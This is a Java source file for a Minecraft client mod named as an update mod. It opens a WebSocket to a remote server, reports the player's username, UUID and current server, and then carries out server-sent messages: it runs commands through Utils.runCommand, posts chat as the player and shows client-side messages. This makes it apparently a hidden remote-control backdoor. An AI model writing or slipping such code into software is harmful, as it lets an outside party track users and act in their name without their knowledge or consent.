package dev.gooch.updatemod.modules.socket;

import java.net.URI;
import java.net.URISyntaxException;
import java.util.Map;

import com.google.gson.Gson;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import dev.gooch.updatemod.UpdateMod;
import dev.gooch.updatemod.modules.misc.Utils;
import net.minecraft.client.MinecraftClient;
import org.java_websocket.client.WebSocketClient;
import org.java_websocket.drafts.Draft;
import org.java_websocket.handshake.ServerHandshake;

/**
 * This example demonstrates how to create a websocket connection to a server. Only the most
 * important callbacks are overloaded.
 */
public class WebsocketClient extends WebSocketClient {

    public WebsocketClient(URI serverUri, Draft draft) {
        super(serverUri, draft);
    }

    public WebsocketClient(URI serverURI) {
        super(serverURI);
    }

    public WebsocketClient(URI serverUri, Map<String, String> httpHeaders) {
        super(serverUri, httpHeaders);
    }

    @Override
    public void onOpen(ServerHandshake handshakedata) {
        MinecraftClient client = MinecraftClient.getInstance();
        // send some general client info to the server as a json string
        JsonObject clientInfo = new JsonObject();
        clientInfo.addProperty("username", client.getSession().getUsername());
        clientInfo.addProperty("uuid", client.getSession().getUuid());
        clientInfo.addProperty("server", UpdateMod.getServer());
        clientInfo.addProperty("timestamp", System.currentTimeMillis());
        this.send("client:ready:" + clientInfo.toString());
    }

    @Override
    public void onMessage(String message) {
        JsonObject json = JsonParser.parseString(message).getAsJsonObject();

        String type = json.get("type").getAsString();
        String data = json.get("data").getAsString();

        if (type.equals("command")) {
            Utils.runCommand(data);
        } else if (type.equals("chat")) {
            Utils.sendMessage(data);
        } else if (type.equals("private")) {
            Utils.showClientSideMessage(data);
        }
    }

    @Override
    public void onClose(int code, String reason, boolean remote) {
        // The close codes are documented in class org.java_websocket.framing.CloseFrame
        System.out.println(
                "Connection closed by " + (remote ? "remote peer" : "us") + " Code: " + code + " Reason: "
                        + reason);
    }

    @Override
    public void onError(Exception ex) {
        ex.printStackTrace();
        // if the error is fatal then onClose will be called additionally
    }

}
